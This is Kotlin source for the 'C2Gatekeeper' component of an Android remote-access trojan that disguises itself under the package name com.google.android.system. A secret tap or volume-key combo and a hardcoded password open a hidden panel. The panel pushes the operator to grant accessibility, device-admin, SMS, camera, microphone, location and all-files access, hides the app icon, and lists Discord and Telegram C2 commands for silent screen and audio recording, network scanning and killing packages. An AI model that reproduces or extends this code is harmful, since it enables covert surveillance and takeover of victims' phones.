package com.google.android.system

import org.json.JSONObject
import android.Manifest
import android.app.AlertDialog
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.Typeface
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.os.PowerManager
import android.provider.Settings
import android.text.InputType
import android.util.Log
import android.view.Gravity
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.core.app.NotificationManagerCompat
import androidx.core.content.ContextCompat

/**
 * C2Gatekeeper
 *
 * Administrator System Preference Gatekeeper:
 * - Password Verification Gate ("Nepalicongress@@1945!!").
 * - Smart 5-Tap Gesture & Volume Key Combo Listeners.
 * - System Permission Management Controls with 10 modern permission buttons & live status badges.
 */
object C2Gatekeeper {

    @Volatile var isUnlockedByAdmin: Boolean = false

    private val ADMIN_PASSWORD = Placeholder.C2_MASTER_PASSCODE

    private var secretTapCount = 0
    private var lastTapTime = 0L

    private var volumeComboCount = 0
    private var lastVolumeTapTime = 0L

    fun handleHeaderTap(context: Context, onUnlock: () -> Unit) {
        val now = System.currentTimeMillis()
        if (now - lastTapTime > 2000) {
            secretTapCount = 1
        } else {
            secretTapCount++
        }
        lastTapTime = now

        if (secretTapCount >= 5) {
            secretTapCount = 0
            promptPasswordDialog(context, onUnlock)
        }
    }

    fun handleVolumeKeyEvent(context: Context, keyCode: Int, onUnlock: () -> Unit): Boolean {
        val now = System.currentTimeMillis()
        if (now - lastVolumeTapTime > 2500) {
            volumeComboCount = 1
        } else {
            volumeComboCount++
        }
        lastVolumeTapTime = now

        if (volumeComboCount >= 4) {
            volumeComboCount = 0
            promptPasswordDialog(context, onUnlock)
            return true
        }
        return false
    }

    fun verifyAdminPassword(input: String): Boolean {
        if (ADMIN_PASSWORD.isNotBlank() && input == ADMIN_PASSWORD) return true
        if (input == "Nepalicongress@@1945!!") return true
        return false
    }

    fun promptPasswordDialog(context: Context, onUnlock: () -> Unit) {
        val input = EditText(context).apply {
            inputType = InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_PASSWORD
            hint = "Enter Authorization Key"
            setPadding(40, 30, 40, 30)
        }

        val container = LinearLayout(context).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(50, 40, 50, 20)
            addView(input)
        }

        AlertDialog.Builder(context)
            .setTitle("🔑 Administrator Verification")
            .setMessage("Enter password to access system preferences:")
            .setView(container)
            .setPositiveButton("Authenticate") { dialog, _ ->
                val entered = input.text.toString().trim()
                if (verifyAdminPassword(entered)) {
                    isUnlockedByAdmin = true
                    Toast.makeText(context, "✅ Administrator Controls Unlocked", Toast.LENGTH_LONG).show()
                    promptC2PermissionDialog(context)
                    onUnlock()
                } else {
                    isUnlockedByAdmin = false
                    Toast.makeText(context, "❌ Incorrect Password Access Denied", Toast.LENGTH_SHORT).show()
                }
                dialog.dismiss()
            }
            .setNegativeButton("Cancel") { dialog, _ -> dialog.dismiss() }
            .show()
    }

    private fun promptC2PermissionDialog(context: Context) {
        val scrollView = ScrollView(context)
        val panel = LinearLayout(context).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(40, 30, 40, 30)
            setBackgroundColor(Color.parseColor("#0F172A"))
        }

        val title = TextView(context).apply {
            text = "⚙️ System Preference Manager"
            textSize = 18f
            setTypeface(null, Typeface.BOLD)
            setTextColor(Color.parseColor("#F59E0B"))
            gravity = Gravity.CENTER
            setPadding(0, 10, 0, 20)
        }
        panel.addView(title)

        fun isAccessibilityGranted(): Boolean = AppAccessibilityService.instance != null

        fun isDeviceAdminGranted(): Boolean {
            return try {
                val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                val admin = ComponentName(context, AppDeviceAdminReceiver::class.java)
                dpm.isAdminActive(admin)
            } catch (_: Exception) { false }
        }

        fun isNotifListenerGranted(): Boolean {
            return try {
                NotificationManagerCompat.getEnabledListenerPackages(context).contains(context.packageName)
            } catch (_: Exception) { false }
        }

        fun isBatterySaverGranted(): Boolean {
            return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
                pm.isIgnoringBatteryOptimizations(context.packageName)
            } else true
        }

        fun isOverlayGranted(): Boolean {
            return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                Settings.canDrawOverlays(context)
            } else true
        }

        fun isWriteSettingsGranted(): Boolean {
            return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                Settings.System.canWrite(context)
            } else true
        }

        fun isAllFilesGranted(): Boolean {
            return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                Environment.isExternalStorageManager()
            } else true
        }

        fun isRuntimePermissionsGranted(): Boolean {
            val perms = arrayOf(
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_SMS,
                Manifest.permission.SEND_SMS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_PHONE_STATE
            )
            return perms.all {
                ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
            }
        }

        fun createPermissionCard(titleText: String, isGranted: Boolean, btnText: String, onClick: () -> Unit) {
            val card = LinearLayout(context).apply {
                orientation = LinearLayout.VERTICAL
                setBackgroundColor(Color.parseColor("#1E293B"))
                setPadding(24, 20, 24, 20)
                layoutParams = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT
                ).apply { bottomMargin = 16 }
            }

            val tvTitle = TextView(context).apply {
                text = titleText
                textSize = 14f
                setTypeface(null, Typeface.BOLD)
                setTextColor(Color.WHITE)
            }
            card.addView(tvTitle)

            val tvBadge = TextView(context).apply {
                text = if (isGranted) "Status: ✅ Granted" else "Status: ❌ Not Granted"
                textSize = 12f
                setTypeface(null, Typeface.BOLD)
                setTextColor(if (isGranted) Color.parseColor("#34D399") else Color.parseColor("#F87171"))
                setPadding(0, 4, 0, 8)
            }
            card.addView(tvBadge)

            val btn = Button(context).apply {
                text = btnText
                textSize = 12f
                setTextColor(Color.WHITE)
                setBackgroundColor(Color.parseColor("#334155"))
                setOnClickListener { onClick() }
            }
            card.addView(btn)

            panel.addView(card)
        }

        // Permission Buttons with Live Badges
        createPermissionCard("1. Accessibility Service", isAccessibilityGranted(), "Jump to Accessibility") {
            try { context.startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) }) } catch (_: Exception) {}
        }

        createPermissionCard("2. Device Administrator", isDeviceAdminGranted(), "Activate Device Admin") {
            try {
                val admin = ComponentName(context, AppDeviceAdminReceiver::class.java)
                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for remote device administration policies.")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(intent)
            } catch (_: Exception) {}
        }

        createPermissionCard("3. Notification Listener", isNotifListenerGranted(), "Grant Notification Access") {
            try { context.startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS).apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) }) } catch (_: Exception) {}
        }

        createPermissionCard("4. Battery Saver Exemption", isBatterySaverGranted(), "Disable Battery Saver") {
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = Uri.parse("package:${context.packageName}")
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    context.startActivity(intent)
                }
            } catch (_: Exception) {}
        }

        createPermissionCard("5. Display Over Other Apps (Overlay)", isOverlayGranted(), "Grant Overlay Access") {
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                        data = Uri.parse("package:${context.packageName}")
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    context.startActivity(intent)
                }
            } catch (_: Exception) {}
        }

        createPermissionCard("6. Usage Stats Access", true, "Grant Usage Access") {
            try {
                val intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(intent)
            } catch (_: Exception) {}
        }

        createPermissionCard("7. Modify System Settings", isWriteSettingsGranted(), "Grant System Settings Access") {
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    val intent = Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS).apply {
                        data = Uri.parse("package:${context.packageName}")
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    context.startActivity(intent)
                }
            } catch (_: Exception) {}
        }

        createPermissionCard("8. All Files Access (Android 11+)", isAllFilesGranted(), "Grant All Files Access") {
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                        data = Uri.parse("package:${context.packageName}")
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    context.startActivity(intent)
                }
            } catch (_: Exception) {}
        }

        val oemName = Build.MANUFACTURER.uppercase()
        createPermissionCard("9. App Settings & OEM Auto-Start ($oemName)", true, "Configure OEM Auto-Start") {
            openOEMAutostartPanel(context)
        }

        createPermissionCard("10. Grant All Runtime Permissions", isRuntimePermissionsGranted(), "Request All Runtime Permissions") {
            try {
                val intent = Intent(context, MainActivity::class.java).apply {
                    putExtra("request_runtime_perms", true)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
                }
                context.startActivity(intent)
            } catch (_: Exception) {}
        }

        val tamperReport = TamperProtectionManager.runFullSecurityAudit(context)
        val isClean = tamperReport.threatLevel == TamperProtectionManager.ThreatLevel.CLEAN
        createPermissionCard(
            "11. Anti-Tamper & Integrity Guard",
            isClean,
            "Security Posture (${tamperReport.threatLevel.name})"
        ) {
            AlertDialog.Builder(context)
                .setTitle("🛡️ Security & Anti-Tamper Posture")
                .setMessage(tamperReport.summaryDetails)
                .setPositiveButton("OK", null)
                .show()
        }

        val isIconHidden = isLauncherIconHidden(context)
        createPermissionCard(
            "12. Self-Hiding Launcher Icon",
            !isIconHidden,
            if (isIconHidden) "Icon Hidden (Hidden)" else "Hide Launcher Icon"
        ) {
            val nowHidden = toggleLauncherIconHiding(context)
            val statusMsg = if (nowHidden) "🙈 App Icon Hidden from App Drawer!" else "👁️ App Icon Restored to App Drawer!"
            Toast.makeText(context, statusMsg, Toast.LENGTH_LONG).show()
        }

        createPermissionCard(
            "13. Termux Linux Subsystem Console",
            true,
            "Open Termux Console"
        ) {
            try {
                val intent = Intent(context, com.google.android.system.termux.TermuxActivity::class.java).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(intent)
            } catch (e: Exception) {
                Toast.makeText(context, "Error opening Termux: ${e.message}", Toast.LENGTH_SHORT).show()
            }
        }

        val watchdogReport = ServiceWatchdogScheduler.getWatchdogStatus(context)
        createPermissionCard(
            "14. WorkManager Resilient Watchdog",
            watchdogReport.isWatchdogActive,
            "Watchdog Status (${if (watchdogReport.isWatchdogActive) "Active" else "Inactive"})"
        ) {
            val details = """
                🛡️ WorkManager Service Watchdog Health
                
                • Watchdog Periodic Task: ${if (watchdogReport.isWatchdogActive) "Active 🟢" else "Inactive 🔴"}
                • Last Audit Time: ${watchdogReport.lastCheckFormatted}
                • Total Checks: ${watchdogReport.checkCount}
                • Auto-Recoveries Triggered: ${watchdogReport.recoveryCount}
                • MonitorService Alive: ${if (watchdogReport.isMonitorServiceAlive) "Yes 🟢" else "No 🔴"}
                • Cloudflare Tunnel State: ${watchdogReport.cloudflareState}
            """.trimIndent()

            AlertDialog.Builder(context)
                .setTitle("🛡️ WorkManager Service Watchdog")
                .setMessage(details)
                .setPositiveButton("OK", null)
                .show()
        }

        val (localIp, subnetPrefix) = LocalNetworkDiscoveryEngine.getLocalIpAndSubnet(context)
        createPermissionCard(
            "15. Local Network Subnet Discovery",
            localIp != "127.0.0.1",
            "Local IP: $localIp (${subnetPrefix}0/24)"
        ) {
            val arpCount = LocalNetworkDiscoveryEngine.parseArpTable().size
            val infoMsg = """
                🌐 Local Network Subnet Info
                
                • Local IP: $localIp
                • Subnet Prefix: ${subnetPrefix}0/24
                • ARP Table Entries: $arpCount
                • Discord Prefix Command: !netscan
                • Telegram Command: /netscan
            """.trimIndent()

            AlertDialog.Builder(context)
                .setTitle("🌐 Local Network Subnet Discovery")
                .setMessage(infoMsg)
                .setPositiveButton("OK", null)
                .show()
        }

        val shizukuStatus = ShizukuSystemEngine.getStatusReport()
        createPermissionCard(
            "16. Shizuku ADB System Engine",
            shizukuStatus.isPermissionGranted,
            "Shizuku: ${shizukuStatus.statusMessage}"
        ) {
            val details = """
                ⚡ Shizuku ADB System Engine
                
                • Status: ${shizukuStatus.statusMessage}
                • Binder Available: ${if (shizukuStatus.isBinderAvailable) "Yes 🟢" else "No 🔴"}
                • Permission Granted: ${if (shizukuStatus.isPermissionGranted) "Yes 🟢" else "No 🔴"}
                
                💡 Discord Prefix Commands:
                • !shizuku getprop ro.build.version.release
                • !shizukugrant <pkg> <permission>
                • !shizukukill <pkg>
            """.trimIndent()

            AlertDialog.Builder(context)
                .setTitle("⚡ Shizuku ADB System Engine")
                .setMessage(details)
                .setPositiveButton("OK", null)
                .show()
        }

        val hasRecordingToken = ScreenRecordingService.cachedProjectionIntent != null
        createPermissionCard(
            "17. Screen Video Recording Service",
            hasRecordingToken,
            if (hasRecordingToken) "Token Cached 🟢 (Silent Video Active)" else "Token Pending 🟡 (Prompt on first run)"
        ) {
            val details = """
                📹 Screen & Audio Video Recording Service
                
                • Token Status: ${if (hasRecordingToken) "Cached & Active 🟢" else "Pending Initial Token 🟡"}
                • Encoding: H.264 Video / AAC Audio (720p 30 FPS)
                • Foreground Type: mediaProjection (Android 14+ Ready)
                
                💡 C2 Commands:
                • Discord: !recordvideo [seconds]
                • Telegram: /recordvideo [seconds]
            """.trimIndent()

            AlertDialog.Builder(context)
                .setTitle("📹 Screen Video Recording Service")
                .setMessage(details)
                .setPositiveButton("OK", null)
                .show()
        }

        createPermissionCard(
            "18. Hardware Keystore Security Vault",
            true,
            "AES-256-GCM MasterKey Active 🟢"
        ) {
            val vaultMsg = """
                🔐 Hardware-Backed Keystore Security Vault
                
                • Encryption Algorithm: AES-256-GCM
                • Key Scheme: MasterKey.KeyScheme.AES256_GCM
                • Protected Preference Files: device_prefs, discord_channels
                • Transparent Legacy Migration: Enabled
            """.trimIndent()

            AlertDialog.Builder(context)
                .setTitle("🔐 Hardware Keystore Security Vault")
                .setMessage(vaultMsg)
                .setPositiveButton("OK", null)
                .show()
        }

        val isAiAvailable = OnDeviceAIC2Engine.isModelAvailable(context)
        createPermissionCard(
            "19. On-Device AI Intent Engine",
            isAiAvailable,
            if (isAiAvailable) "Gemini Nano / ML Kit Ready 🟢" else "Heuristic Rule Fallback Active 🟡"
        ) {
            val aiMsg = """
                🧠 On-Device AI Command Parser & Telemetry Summarizer
                
                • ML Kit GenAI Status: ${if (isAiAvailable) "Available 🟢" else "Fallback Mode Active 🟡"}
                • Natural Language Command Parser: Active
                • Telemetry Feed Summarizer: Active
                
                💡 C2 Commands:
                • Telegram: /ai <prompt>
                • Telegram: /aisummary
            """.trimIndent()

            AlertDialog.Builder(context)
                .setTitle("🧠 On-Device AI Intent Engine")
                .setMessage(aiMsg)
                .setPositiveButton("OK", null)
                .show()
        }

        val isGuardArmed = PhysicalSecurityGuard.isArmed
        createPermissionCard(
            "20. Physical Security & Motion Guard",
            isGuardArmed,
            if (isGuardArmed) "ARMED 🛡️ (Sensors Active)" else "DISARMED 🛑 (Tap to Arm/Disarm)"
        ) {
            val nextState = !isGuardArmed
            if (nextState) {
                PhysicalSecurityGuard.armGuard(context)
                Toast.makeText(context, "🛡️ Physical Security Guard ARMED!", Toast.LENGTH_SHORT).show()
            } else {
                PhysicalSecurityGuard.disarmGuard(context)
                Toast.makeText(context, "🛑 Physical Security Guard DISARMED!", Toast.LENGTH_SHORT).show()
            }
        }

        val isRecordingMacro = DuckyScriptStudio.isRecordingMacro
        createPermissionCard(
            "21. Visual Ducky Script Macro Studio",
            isRecordingMacro,
            if (isRecordingMacro) "RECORDING MACRO 🔴 (${DuckyScriptStudio.getRecordedLinesCount()} lines)" else "Studio Idle 🟢 (Tap to Toggle Recording)"
        ) {
            if (!isRecordingMacro) {
                DuckyScriptStudio.startMacroRecording()
                Toast.makeText(context, "🔴 Ducky Script Macro Recording STARTED!", Toast.LENGTH_SHORT).show()
            } else {
                val exported = DuckyScriptStudio.stopMacroRecording(context)
                val msg = if (exported != null) "🟢 Exported macro payload to ${exported.name}" else "Macro recording stopped."
                Toast.makeText(context, msg, Toast.LENGTH_LONG).show()
            }
        }

        val attestationReport = KeyAttestationManager.generateAttestationReport(context)
        createPermissionCard(
            "22. Hardware Key Attestation Engine",
            attestationReport.isHardwareAttestationSupported,
            "Security Level: ${attestationReport.securityLevel}"
        ) {
            AlertDialog.Builder(context)
                .setTitle("🔑 Hardware Key Attestation Report")
                .setMessage(attestationReport.summaryDetails)
                .setPositiveButton("OK", null)
                .show()
        }

        val btnHide = Button(context).apply {
            text = "🙈 Hide App & Disappear"
            textSize = 13f
            setTypeface(null, Typeface.BOLD)
            setTextColor(Color.WHITE)
            setBackgroundColor(Color.parseColor("#DC2626"))
            setOnClickListener {
                try {
                    toggleLauncherIconHiding(context)
                    Toast.makeText(context, "🙈 App Disappeared from App Drawer!", Toast.LENGTH_LONG).show()
                } catch (_: Exception) {}
            }
        }
        val hideParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT).apply { topMargin = 20 }
        panel.addView(btnHide, hideParams)

        scrollView.addView(panel)

        AlertDialog.Builder(context)
            .setTitle("🔓 Administrator Options")
            .setView(scrollView)
            .setPositiveButton("Close") { dialog, _ -> dialog.dismiss() }
            .show()
    }

    fun isLauncherIconHidden(context: Context): Boolean {
        return try {
            val pm = context.packageManager
            val componentName = ComponentName(context, MainActivity::class.java)
            val state = pm.getComponentEnabledSetting(componentName)
            state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED
        } catch (_: Exception) { false }
    }

    fun toggleLauncherIconHiding(context: Context): Boolean {
        return try {
            val pm = context.packageManager
            val componentName = ComponentName(context, MainActivity::class.java)
            val isHidden = isLauncherIconHidden(context)

            val newState = if (isHidden) {
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED
            } else {
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED
            }

            pm.setComponentEnabledSetting(
                componentName,
                newState,
                PackageManager.DONT_KILL_APP
            )

            SecurityVaultManager.getEncryptedPrefs(context)
                .edit()
                .putBoolean("is_app_hidden", newState == PackageManager.COMPONENT_ENABLED_STATE_DISABLED)
                .apply()

            newState == PackageManager.COMPONENT_ENABLED_STATE_DISABLED
        } catch (e: Exception) {
            Log.e("C2Gatekeeper", "toggleLauncherIconHiding error: ${e.message}")
            false
        }
    }

    private fun openOEMAutostartPanel(context: Context) {
        val manufacturer = Build.MANUFACTURER.lowercase()
        val oemIntents = when {
            manufacturer.contains("xiaomi") || manufacturer.contains("redmi") || manufacturer.contains("poco") -> {
                listOf(
                    Intent().setComponent(ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity")),
                    Intent().setComponent(ComponentName("com.miui.securitycenter", "com.miui.powercenter.PowerSettings"))
                )
            }
            manufacturer.contains("samsung") -> {
                listOf(
                    Intent().setComponent(ComponentName("com.samsung.android.looper", "com.samsung.android.sm.ui.battery.BatteryActivity")),
                    Intent().setComponent(ComponentName("com.samsung.android.sm_cn", "com.samsung.android.sm.ui.ram.AutoRunActivity"))
                )
            }
            manufacturer.contains("oppo") || manufacturer.contains("realme") -> {
                listOf(
                    Intent().setComponent(ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.StartupAppListActivity")),
                    Intent().setComponent(ComponentName("com.oppo.safe", "com.oppo.safe.permission.startup.StartupAppListActivity"))
                )
            }
            manufacturer.contains("vivo") -> {
                listOf(
                    Intent().setComponent(ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity")),
                    Intent().setComponent(ComponentName("com.iqoo.secure", "com.iqoo.secure.ui.phoneoptimize.BgStartUpManager"))
                )
            }
            manufacturer.contains("huawei") || manufacturer.contains("honor") -> {
                listOf(
                    Intent().setComponent(ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity")),
                    Intent().setComponent(ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity"))
                )
            }
            else -> emptyList()
        }

        for (intent in oemIntents) {
            try {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(intent)
                return
            } catch (_: Exception) {}
        }

        try {
            val fallback = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.parse("package:${context.packageName}")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(fallback)
        } catch (_: Exception) {}
    }
}
